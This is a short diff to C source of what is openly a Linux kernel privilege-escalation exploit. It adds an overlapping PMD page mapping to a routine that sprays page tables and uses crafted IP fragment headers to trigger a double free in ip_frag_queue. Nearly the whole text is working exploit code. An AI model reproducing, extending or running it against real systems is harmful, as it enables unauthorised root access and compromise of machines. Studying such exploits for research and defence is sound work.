@@ -90,6 +90,7 @@ static void alloc_ipv4_udp(size_t content_size)
 
 static void privesc_flh_bypass_no_time()
 {
+	void *_pmd_area;
 	struct ip df_ip_header = {
 		.ip_v = 4,
 		.ip_hl = 5,
@@ -130,6 +131,8 @@ static void privesc_flh_bypass_no_time()
 	// PTE_SPRAY_AMOUNT / 512 = PMD_SPRAY_AMOUNT: PMD contains 512 PTE children
 	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT / 512; i++)
 		*(char*)PTI_TO_VIRT(2, i, 0, 0, 0) = 0x41;
+			// these use different PTEs but the same PMD
+	_pmd_area = mmap((void*)PTI_TO_VIRT(1, 1, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 	
 	populate_sockets();
 
@@ -182,6 +185,9 @@ static void privesc_flh_bypass_no_time()
 	// causes end == offset in ip_frag_queue(). packet will be empty
 	// remains running until after both frees, a.k.a. does not require sleep
 	alloc_intermed_buf_hdr(0, &df_ip_header);
+
+	// allocate overlapping PMD page (overlaps with PTE)
+	*(unsigned long long*)_pmd_area = 0xCAFEBABE;
 }
 
 int main()
